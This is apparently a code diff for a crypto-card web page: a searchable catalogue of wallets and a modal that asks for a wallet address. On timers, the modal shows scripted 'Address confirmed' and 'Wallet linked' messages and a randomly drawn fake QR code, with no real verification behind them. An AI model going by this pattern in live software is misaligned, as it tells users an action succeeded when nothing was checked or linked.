+    { name:'Atomic Wallet', key:'atomic',       cat:'Multi-chain',type:'Desktop · Multi-chain', emoji:'⚛️', color:'#2E86DE', badge:'',        desc:'Decentralized custody and built-in atomic swaps.' },
+    { name:'BitGet Wallet', key:'bitget',       cat:'Multi-chain',type:'Mobile · Multi-chain',  emoji:'🅱️', color:'#00BBFF', badge:'',        desc:'100+ chain support with built-in swap and NFT marketplace.' },
+    { name:'OKX Wallet',    key:'okx',          cat:'Multi-chain',type:'Browser · Multi-chain', emoji:'⬛', color:'#555',    badge:'',        desc:'OKX DEX, cross-chain bridge, and NFT aggregation in one.' },
+    { name:'Crypto.com DeFi',key:'cryptocom',   cat:'Multi-chain',type:'Mobile · Multi-chain',  emoji:'💙', color:'#002D74', badge:'',        desc:'Non-custodial DeFi wallet from Crypto.com — NFTs & DeFi.' },
+    { name:'imToken',       key:'imtoken',      cat:'Multi-chain',type:'Mobile · Multi-chain',  emoji:'💎', color:'#1B72E8', badge:'',        desc:'Leading Ethereum wallet in Asia. Supports 12+ blockchains.' },
+    { name:'TokenPocket',   key:'tokenpocket',  cat:'Multi-chain',type:'Mobile · Multi-chain',  emoji:'👛', color:'#11A37F', badge:'',        desc:'Multi-chain wallet with dApp browser for EVM, Solana & BTC.' },
+    { name:'Math Wallet',   key:'math',         cat:'Multi-chain',type:'Browser · Multi-chain', emoji:'🔢', color:'#000080', badge:'',        desc:'Universal Web3 wallet for 100+ public blockchains.' },
+    { name:'WalletConnect', key:'walletconnect',cat:'Multi-chain',type:'All Wallets',            emoji:'🔗', color:'#3B99FC', badge:'',        desc:'Scan a QR code to connect any WalletConnect-compatible app.' },
+    { name:'Sequence',      key:'sequence',     cat:'Multi-chain',type:'Browser · EVM',          emoji:'🔮', color:'#7B2EFA', badge:'',        desc:'Smart wallet SDK — supports email & social login.' },
+    { name:'Infinity Wallet',key:'infinity',    cat:'Multi-chain',type:'Desktop · Multi-chain', emoji:'∞',  color:'#6C5CE7', badge:'',        desc:'Feature-rich desktop Web3 wallet with DEX and DeFi built in.' },
+    // Cosmos
+    { name:'Keplr',         key:'keplr',        cat:'Cosmos',     type:'Browser · Cosmos IBC',  emoji:'🌌', color:'#7952E7', badge:'Popular', desc:'The original Cosmos interchain wallet. 30+ IBC chains supported.' },
+    { name:'Leap',          key:'leap',         cat:'Cosmos',     type:'Browser · Cosmos',      emoji:'🐸', color:'#29CC6A', badge:'',        desc:'Feature-rich Cosmos wallet with staking and governance.' },
+    { name:'Cosmostation',  key:'cosmostation', cat:'Cosmos',     type:'Mobile · Cosmos',       emoji:'🌠', color:'#546CA5', badge:'',        desc:'Staking, governance, and DeFi across 50+ Cosmos chains.' },
+    { name:'Station',       key:'station',      cat:'Cosmos',     type:'Browser · Terra/IBC',   emoji:'🌍', color:'#172852', badge:'',        desc:'Terra Station wallet for LUNA and the broader Cosmos IBC.' },
+    // Aptos / Sui
+    { name:'Petra',         key:'petra',        cat:'Aptos/Sui',  type:'Browser · Aptos',       emoji:'🔷', color:'#00B5E2', badge:'Official',desc:'Official Aptos Foundation wallet. Move-language smart contracts.' },
+    { name:'Martian',       key:'martian',      cat:'Aptos/Sui',  type:'Browser · Aptos',       emoji:'👽', color:'#7B4AE2', badge:'',        desc:'Feature-rich Aptos wallet with NFT marketplace and swaps.' },
+    { name:'Sui Wallet',    key:'sui',          cat:'Aptos/Sui',  type:'Browser · Sui',         emoji:'💧', color:'#6FBCF0', badge:'Official',desc:'Official Sui Foundation wallet. Built for Sui network apps.' },
+    { name:'Ethos',         key:'ethos',        cat:'Aptos/Sui',  type:'Browser · Sui',         emoji:'🌀', color:'#7B61FF', badge:'',        desc:'Smart wallet for Sui with mobile app and browser extension.' },
+    { name:'Nightly',       key:'nightly',      cat:'Aptos/Sui',  type:'Browser · Multi',       emoji:'🌙', color:'#8B5CF6', badge:'',        desc:'Non-custodial wallet for Aptos, Sui, and Solana in one.' },
+    // Multi-chain — extended
+    { name:'SafePal',       key:'safepal',      cat:'Multi-chain',type:'Hardware + App',         emoji:'🛡️', color:'#1BA1E2', badge:'Popular', desc:'SafePal S1 hardware wallet + mobile app. Air-gapped signing.' },
+    { name:'Coin98',        key:'coin98',       cat:'Multi-chain',type:'Mobile · Multi-chain',   emoji:'🪙', color:'#D4A017', badge:'',        desc:'All-in-one DeFi wallet for 40+ blockchains. Huge in Asia.' },
+    { name:'Frontier',      key:'frontier',     cat:'Multi-chain',type:'Mobile · Multi-chain',   emoji:'🌐', color:'#CC2929', badge:'',        desc:'Multi-chain DeFi wallet with staking, swaps, and NFTs.' },
+    { name:'Binance Web3',  key:'binanceweb3',  cat:'Multi-chain',type:'Mobile · Multi-chain',   emoji:'🟡', color:'#F0B90B', badge:'',        desc:'Built-in Web3 wallet inside the Binance app. BNB Chain focus.' },
+    { name:'Bybit Wallet',  key:'bybit',        cat:'Multi-chain',type:'Mobile · Multi-chain',   emoji:'🔷', color:'#F7A600', badge:'',        desc:'Web3 wallet embedded in Bybit exchange. EVM + Solana support.' },
+    { name:'Zengo',         key:'zengo',        cat:'Multi-chain',type:'Mobile · MPC',            emoji:'🔑', color:'#1DC8FF', badge:'',        desc:'MPC wallet — no seed phrase. 3-factor biometric security.' },
+    { name:'Uniswap Wallet',key:'uniswap',      cat:'Multi-chain',type:'Mobile · EVM',           emoji:'🦄', color:'#FF007A', badge:'',        desc:'Official wallet from the Uniswap team. Swap directly in-app.' },
+    { name:'ShapeShift',    key:'shapeshift',   cat:'Multi-chain',type:'Browser · Multi-chain',  emoji:'🦊', color:'#0037FF', badge:'',        desc:'Open-source, self-custody multi-chain wallet with built-in DEX.' },
+    { name:'Unstoppable',   key:'unstoppable',  cat:'Multi-chain',type:'Mobile · Multi-chain',   emoji:'🔒', color:'#4F46E5', badge:'',        desc:'Privacy-focused multi-chain wallet. No KYC, no accounts.' },
+    { name:'Edge',          key:'edge',         cat:'Multi-chain',type:'Mobile · Multi-chain',   emoji:'🔺', color:'#0073FF', badge:'',        desc:'Security-first mobile wallet. Client-side encryption on device.' },
+    { name:'Venly',         key:'venly',        cat:'Multi-chain',type:'Mobile · Gaming',        emoji:'🎮', color:'#7B3FE4', badge:'',        desc:'Gaming-focused Web3 wallet with social login and NFT support.' },
+    { name:'Status',        key:'status',       cat:'Multi-chain',type:'Mobile · EVM',           emoji:'💬', color:'#4360DF', badge:'',        desc:'Encrypted messenger + Ethereum wallet + dApp browser in one.' },
+    // Hardware — extended
+    { name:'OneKey',        key:'onekey',       cat:'Hardware',   type:'Hardware · All chains',  emoji:'1️⃣', color:'#00B760', badge:'',        desc:'Open-source hardware wallet. Compatible with MetaMask & more.' },
+    { name:'Ellipal Titan', key:'ellipal',      cat:'Hardware',   type:'Hardware · Air-gapped',  emoji:'🏔️', color:'#2F80ED', badge:'',        desc:'100% air-gapped. No USB, no Bluetooth — QR code only.' },
+    { name:'Tangem',        key:'tangem',       cat:'Hardware',   type:'Hardware · NFC card',    emoji:'💳', color:'#27AE60', badge:'',        desc:'Hardware wallet as a physical NFC card. Tap to sign.' },
+    { name:'D\'CENT',       key:'dcent',        cat:'Hardware',   type:'Hardware · Biometric',   emoji:'👆', color:'#E84393', badge:'',        desc:'Biometric hardware wallet with built-in fingerprint scanner.' },
+    { name:'KeepKey',       key:'keepkey',      cat:'Hardware',   type:'Hardware · EVM/BTC',     emoji:'🔷', color:'#1D3557', badge:'',        desc:'Simple, elegant hardware wallet by ShapeShift. Large screen.' },
+    { name:'Cypherock X1',  key:'cypherock',    cat:'Hardware',   type:'Hardware · Seedless',    emoji:'⚗️', color:'#7928CA', badge:'',        desc:'Seedless hardware wallet using shamir secret sharing cards.' },
+    { name:'Jade',          key:'jade',         cat:'Hardware',   type:'Hardware · Bitcoin',     emoji:'💚', color:'#00B386', badge:'',        desc:'Blockstream Jade — open-source Bitcoin hardware wallet.' },
+    { name:'Passport',      key:'passport',     cat:'Hardware',   type:'Hardware · Bitcoin',     emoji:'📗', color:'#2D6A4F', badge:'',        desc:'Foundation Passport — open-source Bitcoin-only hardware wallet.' },
+    // Bitcoin — extended
+    { name:'BlueWallet',    key:'bluewallet',   cat:'Bitcoin',    type:'Mobile · BTC + Lightning',emoji:'🔵', color:'#1877F2', badge:'',        desc:'Simple and powerful Bitcoin and Lightning wallet for mobile.' },
+    { name:'Muun',          key:'muun',         cat:'Bitcoin',    type:'Mobile · BTC + Lightning',emoji:'🌙', color:'#5B2D8E', badge:'',        desc:'Self-custodial Bitcoin + Lightning wallet. Very easy UX.' },
+    { name:'Electrum',      key:'electrum',     cat:'Bitcoin',    type:'Desktop · Bitcoin',      emoji:'⚡', color:'#2F86FB', badge:'',        desc:'Legendary desktop Bitcoin wallet since 2011. Hardware compatible.' },
+    { name:'Green Wallet',  key:'green',        cat:'Bitcoin',    type:'Mobile · Bitcoin',       emoji:'🟢', color:'#00B050', badge:'',        desc:'Blockstream Green — multi-sig Bitcoin wallet for iOS & Android.' },
+    { name:'Wasabi',        key:'wasabi',       cat:'Bitcoin',    type:'Desktop · Bitcoin',      emoji:'🫐', color:'#735BF2', badge:'',        desc:'Privacy-first Bitcoin wallet with built-in CoinJoin mixing.' },
+    { name:'Alby',          key:'alby',         cat:'Bitcoin',    type:'Browser · Lightning',    emoji:'⚡', color:'#FFDE00', badge:'',        desc:'Bitcoin Lightning browser extension. Zap and stream sats.' },
+    { name:'Nunchuk',       key:'nunchuk',      cat:'Bitcoin',    type:'Mobile · Bitcoin',       emoji:'🥷', color:'#374151', badge:'',        desc:'Collaborative multi-sig Bitcoin wallet for teams and families.' },
+  ];
+
+  // Derived lookup maps from WALLETS array
+  const WALLET_COLORS = Object.fromEntries(WALLETS.map(w => [w.key, w.color]));
+  const WALLET_EMOJIS = Object.fromEntries(WALLETS.map(w => [w.key, w.emoji]));
+
+  // State for grid filtering
+  let activeCategory = 'All';
+  let searchQuery = '';
+  let wmWalletName = '';
+  let wmWalletKey  = '';
+  let wmWalletDesc = '';
+
+  function buildCategories() {
+    const cats = document.getElementById('wgCats');
+    const order = ['All','EVM','Multi-chain','Solana','Bitcoin','Hardware','Cosmos','Aptos/Sui'];
+    cats.innerHTML = order.map((c, i) => `
+      <button class="wg-cat-btn${i === 0 ? ' active' : ''}" data-cat="${c}" onclick="filterByCategory('${c}', this)">${c}</button>
+    `).join('');
+  }
+
+  function renderWallets(list) {
+    const grid  = document.getElementById('wgGrid');
+    const empty = document.getElementById('wgEmpty');
+    const count = document.getElementById('wgCount');
+    if (list.length === 0) {
+      grid.innerHTML = '';
+      empty.style.display = 'flex';
+      count.textContent = '';
+      return;
+    }
+    empty.style.display = 'none';
+    count.textContent = `${list.length} wallet${list.length === 1 ? '' : 's'} found`;
+    // Pass only the key (safe ASCII) — openWalletModal looks up the rest from WALLETS
+    grid.innerHTML = list.map(w => `
+      <div class="wg-card" data-name="${w.name}" data-cat="${w.cat}"
+           onclick="openWalletModal('${w.key}')">
+        <div class="wg-logo" style="background:${w.color}22">
+          <span style="font-size:26px;line-height:1">${w.emoji}</span>
+        </div>
+        <div class="wg-name">${w.name}</div>
+        <div class="wg-type">${w.cat}</div>
+        ${w.badge ? `<div class="wg-pop">${w.badge}</div>` : ''}
+      </div>
+    `).join('');
+  }
+
+  function filterByCategory(cat, btn) {
+    activeCategory = cat;
+    document.querySelectorAll('.wg-cat-btn').forEach(b => b.classList.remove('active'));
+    btn.classList.add('active');
+    applyFilters();
+  }
+
+  function applyFilters() {
+    let list = WALLETS;
+    if (activeCategory !== 'All') list = list.filter(w => w.cat === activeCategory);
+    if (searchQuery) {
+      const q = searchQuery.toLowerCase();
+      list = list.filter(w => w.name.toLowerCase().includes(q) || w.cat.toLowerCase().includes(q) || w.type.toLowerCase().includes(q));
+    }
+    renderWallets(list);
+  }
+
+  function filterWallets(q) {
+    searchQuery = q;
+    document.getElementById('wgClear').style.display = q ? '' : 'none';
+    applyFilters();
+  }
+
+  function clearSearch() {
+    const input = document.getElementById('wgSearch');
+    input.value = '';
+    searchQuery = '';
+    document.getElementById('wgClear').style.display = 'none';
+    input.focus();
+    applyFilters();
+  }
+
+  // ── SCREEN 2: quick picks + full search ──────────────────────────
+  const S2_QUICK_KEYS = ['metamask','coinbase','phantom','walletconnect','rainbow','ledger','trust','phantom'];
+  // dedupe and take first 8 popular
+  const S2_QUICK = ['metamask','coinbase','phantom','walletconnect','rainbow','ledger','trust','backpack'];
+
+  function buildS2() {
+    const grid = document.getElementById('s2QuickGrid');
+    if (!grid) return;
+    grid.innerHTML = S2_QUICK.map(k => {
+      const w = WALLETS.find(x => x.key === k);
+      if (!w) return '';
+      return `
+        <button class="wallet-btn" style="--accent:${w.color};--glow:0,82,255"
+                onclick="connectWallet('${w.name}','${w.emoji}','${w.color}')">
+          <div class="wallet-logo" style="background:${w.color}22">${w.emoji}</div>
+          <div>
+            <div class="wallet-name">${w.name}</div>
+            <div class="wallet-type">${w.type}</div>
+          </div>
+          <div class="wallet-arrow">›</div>
+        </button>`;
+    }).join('');
+  }
+
+  function renderS2Grid(list) {
+    const grid = document.getElementById('s2WgGrid');
+    if (!grid) return;
+    grid.innerHTML = list.map(w => `
+      <div class="wg-card" onclick="connectWallet('${w.name}','${w.emoji}','${w.color}')">
+        <div class="wg-logo" style="background:${w.color}22">
+          <span style="font-size:26px;line-height:1">${w.emoji}</span>
+        </div>
+        <div class="wg-name">${w.name}</div>
+        <div class="wg-type">${w.cat}</div>
+        ${w.badge ? `<div class="wg-pop">${w.badge}</div>` : ''}
+      </div>
+    `).join('');
+  }
+
+  function filterS2(q) {
+    const fullDiv = document.getElementById('s2FullGrid');
+    const clear   = document.getElementById('s2Clear');
+    clear.style.display = q ? '' : 'none';
+    if (!q) { fullDiv.style.display = 'none'; return; }
+    fullDiv.style.display = '';
+    const results = WALLETS.filter(w =>
+      w.name.toLowerCase().includes(q.toLowerCase()) ||
+      w.cat.toLowerCase().includes(q.toLowerCase())
+    );
+    renderS2Grid(results);
+  }
+
+  function clearS2() {
+    const inp = document.getElementById('s2Search');
+    inp.value = '';
+    inp.focus();
+    document.getElementById('s2Clear').style.display = 'none';
+    document.getElementById('s2FullGrid').style.display = 'none';
+  }
+
+  buildS2();
+
+  // Initialize wallet grid (Screen 8)
+  buildCategories();
+  renderWallets(WALLETS);
+
+  function openWalletModal(key) {
+    const w = WALLETS.find(x => x.key === key) || { name:key, key, type:'Unknown', desc:'', emoji:'🔗', color:'#0052FF' };
+    wmWalletName = w.name;
+    wmWalletKey  = key;
+    wmWalletDesc = w.desc;
+    const name  = w.name;
+    const type  = w.type;
+    const desc  = w.desc;
+
+    const color = w.color || '#0052FF';
+    const emoji = w.emoji || '🔗';
+
+    // Reset screens
+    document.getElementById('wmS1').style.display = '';
+    document.getElementById('wmS2').style.display = 'none';
+    document.getElementById('wmS3').style.display = 'none';
+
+    // Logo row
+    document.getElementById('wmLogoRow').innerHTML = `
+      <div class="wm-logo-icon" style="background:${color}22;border:1.5px solid ${color}44">
+        <span style="font-size:22px">${emoji}</span>
+      </div>
+      <span style="font-weight:800;font-size:16px">${name}</span>
+    `;
+
+    // Wallet icon
+    document.getElementById('wmIcon').textContent = emoji;
+    document.getElementById('wmIcon').style.background = `${color}22`;
+    document.getElementById('wmIcon').style.borderColor = `${color}55`;
+
+    document.getElementById('wmTitle').textContent = `Connect ${name}`;
+    document.getElementById('wmDesc').textContent  = desc;
+    document.getElementById('wmBtnName').textContent = name;
+
+    // Info box
+    document.getElementById('wmInfo').innerHTML = `
+      <div class="wm-info-row"><span>Network</span><strong>${type}</strong></div>
+      <div class="wm-info-row"><span>Permissions</span><strong>Read address only</strong></div>
+      <div class="wm-info-row"><span>Keys stay on</span><strong>Your device</strong></div>
+    `;
+
+    // QR for WalletConnect
+    const qrHint = document.getElementById('wmQrHint');
+    if (key === 'walletconnect') {
+      qrHint.style.display = '';
+      renderFakeQR();
+      document.getElementById('wmConnectBtn').style.display = 'none';
+    } else {
+      qrHint.style.display = 'none';
+      document.getElementById('wmConnectBtn').style.display = '';
+    }
+
+    document.getElementById('wmOverlay').classList.add('open');
+    document.body.style.overflow = 'hidden';
+  }
+
+  function closeWalletModal(e) {
+    if (e && e.target !== document.getElementById('wmOverlay')) return;
+    document.getElementById('wmOverlay').classList.remove('open');
+    document.body.style.overflow = '';
+  }
+
+  function startWalletConnect() {
+    // Validate address input
+    const input = document.getElementById('wmAddrInput');
+    const err   = document.getElementById('wmAddrError');
+    const addr  = input ? input.value.trim() : '';
+
+    if (!addr || addr.length < 6) {
+      if (err)   err.style.display = '';
+      if (input) {
+        input.style.borderColor = '#F87171';
+        input.style.boxShadow   = '0 0 0 3px rgba(248,113,113,.15)';
+        setTimeout(() => { input.style.borderColor = ''; input.style.boxShadow = ''; }, 1600);
+      }
+      return;
+    }
+    if (err) err.style.display = 'none';
+
+    // Brief connecting screen
+    document.getElementById('wmS1').style.display = 'none';
+    document.getElementById('wmS2').style.display = '';
+
+    const color = WALLET_COLORS[wmWalletKey] || '#0052FF';
+    const emoji = WALLET_EMOJIS[wmWalletKey] || '🔗';
+    document.getElementById('wmMidIcon').textContent    = emoji;
+    document.getElementById('wmMidIcon').style.background   = `${color}22`;
+    document.getElementById('wmMidIcon').style.borderColor  = `${color}44`;
+    document.getElementById('wmConnTitle').textContent  = `Verifying ${wmWalletName}…`;
+    document.getElementById('wmConnSub').textContent    = 'Checking address and linking to card';
+
+    const log = document.getElementById('wmLog');
+    log.innerHTML = '';
+    [
+      { t:0,   cls:'info', msg:`Validating ${wmWalletName} address…` },
+      { t:500, cls:'ok',   msg:'Address confirmed ✓' },
+      { t:900, cls:'ok',   msg:'Wallet linked to card ✓' },
+    ].forEach(({t, cls, msg}) => {
+      setTimeout(() => {
+        const d = document.createElement('div');
+        d.className = `log-line ${cls}`;
+        d.innerHTML = `<span class="log-dot">●</span><span>${msg}</span>`;
+        log.appendChild(d);
+      }, t);
+    });
+
+    setTimeout(() => showWalletSuccess(addr), 1400);
+  }
+
+  function showWalletSuccess(addr) {
+    document.getElementById('wmS2').style.display = 'none';
+    document.getElementById('wmS3').style.display = '';
+
+    // Truncate address for display
+    const displayAddr = addr.length > 16
+      ? addr.slice(0, 10) + '…' + addr.slice(-6)
+      : addr;
+
+    document.getElementById('wmSuccessSub').textContent = `${wmWalletName} is now linked to your crypto card`;
+    document.getElementById('wmLinkedBox').innerHTML = `
+      <div class="wm-linked-row"><span>Wallet</span><strong>${wmWalletName}</strong></div>
+      <div class="wm-linked-row"><span>Address</span><strong style="font-family:'JetBrains Mono',monospace;font-size:11px">${displayAddr}</strong></div>
+      <div class="wm-linked-row"><span>Balance</span><strong style="color:#94A3B8">$0.00</strong></div>
+      <div class="wm-linked-row"><span>Spending</span><strong style="color:#34D399">✓ Active</strong></div>
+    `;
+  }
+
+  function finishWalletConnect() {
+    document.getElementById('wmOverlay').classList.remove('open');
+    document.body.style.overflow = '';
+    // Update main card wallet strip with connected wallet info
+    const addr = document.getElementById('wmAddrInput') ? document.getElementById('wmAddrInput').value.trim() : '';
+    document.getElementById('wsWalletName').textContent = wmWalletName;
+    document.getElementById('wsBal').textContent  = '$0.00';
+    document.getElementById('revealBal').textContent = '$0.00';
+    document.getElementById('cd-wallet').textContent = wmWalletName + ' Wallet';
+    if (addr && document.getElementById('wsAddr')) {
+      const display = addr.length > 16 ? addr.slice(0,8)+'…'+addr.slice(-6) : addr;
+      document.getElementById('wsAddr').textContent = display;
+    }
+    showScreen('s5');
+  }
+
+  function renderFakeQR() {
+    const el = document.getElementById('wmQrInner');
+    const SIZE = 12;
+    let html = '';
+    for (let r = 0; r < SIZE; r++) {
+      for (let c = 0; c < SIZE; c++) {
+        const on = (r<3&&c<3)||(r<3&&c>8)||(r>8&&c<3) ? true : Math.random() > .5;
+        html += `<div class="qr-cell${on?' qr-on':''}"></div>`;
+      }
+    }
+    el.innerHTML = html;
+  }
 
 </script>
+<script src="config.js"></script>
 </body>
 </html>
